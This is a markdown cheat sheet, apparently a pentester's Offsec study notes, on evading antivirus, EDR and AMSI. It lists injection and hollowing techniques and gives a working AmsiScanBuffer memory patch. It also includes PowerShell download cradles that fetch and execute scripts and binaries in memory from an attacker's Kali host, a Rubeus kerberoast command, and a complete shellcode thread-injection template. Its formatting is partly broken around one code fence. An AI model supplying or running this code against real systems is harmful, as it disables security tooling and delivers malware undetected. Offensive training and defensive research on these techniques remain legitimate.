---
layout: blank
pagetitle: Antivirus Evasion
---

## EDRs
- 7 general components:
    - File Engine
    - Memory Engine
    - Network Engine
    - Disassembler
    - Emulator/Sandbox
    - Browser Plugin
    - Machine Learning Engine
- Detection methods:
    - Signature
        - Hash the malware. If it matches, it's a virus
    - Heuristic
        - Achieved by stepping through instruction set of a binary file and searching for patterns
    - Behavioral
        - Execute the file in an emulated environment and watching for suspicious actions
    - Machine Learning

## Bypassing Detection

**On-disk Evasion**
- Obfuscators can be marginally effective
- _Crypter_ cryptographically alters code and only decrypts in memory
    - Encryption is one of the most effective AV evasion techniques
- Anti-reversing, Anti-debugging, VM detection
- Software protectors like _Anti-copy_
- _The Enigma Protector_ can successfully bypass antiviruses 

**In-Memory Evasion**
- Injecting into the memory of another process
    - Use OpenProcess to obtain a valid HANDLE
    - Use VirtualAllocEx to allocate memory in the context of the process with that HANDLE
    - After memory allocated, copy the malicious payload to the new allocate dmemory
- DLL Injection
    - Loads a malicious DLL from disk using LoadLibrary API
        - LoadLibrary must load DLL from disk
    - Reflective DLL injection
        - Loads a DLL stored by attacker into process memory
- Process Hollowing
    - Launch non-malicious process in suspended state
    - Remove process image and replace with malicious executable image
    - Resume process
- Inline hooking
    - Modify memory to introduce a hook into malicious code, returning back to original point after execution

## Evasion in Practice
- Use AntiScan.me to test malware if target AV vendor is unknown, which doesn't submit samples to third-parties
- DISABLE AUTOMATIC SAMPLE SUBMISSION TO TEST ON DEFENDER
- **Thread Injection**
    - Powershell scripts can be really difficult to fingerprint, so changing things like variable names can actually help
        - If running scripts is disabled, use `-ExecutionPolicy Bypass` flag or `Set-ExecutionPolicy -ExecutionPolicy Unrestricted CurrentUser`
        - LMFAO
    - Example in Offsec:
        - Used a well-known memory injection PowerShell script, using msfvenom shellcode as the payload
        - Changed variable names and bypassed Avira antivirus
- **Automating AV evasion**
    - _Shellter_ is a popular shellcode injection tool capable of bypassing antivirus software
        - `sudo apt install shellter`
        - Best to inject into a non-well known process
        - Can use Meterpreter payloads
- DLL injection without touching disk
    - Share the DLL remotely with `sudo impacket-smbserver share ./`

## AMSI
- [Anti-Malware Scanning Interface](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- Can be bypassed using a number of tricks, but the scripts are all recognized by AMSI
    - Techniques here: [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
    - Thus, we'll need to find the trigger and change the signature with variable renaming, function replacement, or encoding at runtime
        - Can also use ISESteroids or [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
    - [amsi.fail](https://amsi.fail/) - Great site for generating obfuscated powershell scripts that break/disable AMSI for current process
    - However, this won't bypass AMSI at the .net level - [https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/]https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
        - Thus, we also need the following script to bypass AMSI at the .net level (run with `(new-object system.net.webclient).downloadstring('http://{kali_ip:port}/amsi_rmouse.txt')|IEX`)
            - This loads and executes the script directly in memory

```Powershell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

- We now have the ability to run anything we'd like, as long as it doesn't touch disk, which can be done like so:

```Powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://{kali_IP:port}/{exe_binary}');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[{binary_name}.Program]::Main(@('{params}'));[Console]::SetOut($out);$sWriter.ToString()

## Thread Injection
- Operates within the process it's being executed from
- Rename the variables to bypass string detection

```

- If instead of dealing with executables we'd just like to use powershell, we can use [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
    - `iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpPack.ps1 -o psp.ps1`
    - Insanely useful powershell script that has C# executables bundled into it as compiled base64 binaries
    - Run with `iex(new-object net.webclient).downloadstring('http://{kali_IP:port}/PowerSharpPack.ps1')` and `PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`, for example

# Import VirtualAlloc to allocate memory

```Powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

# Import CreateThread to create execution threads
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

# Import memset to write arbitrary data to allocated memory
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```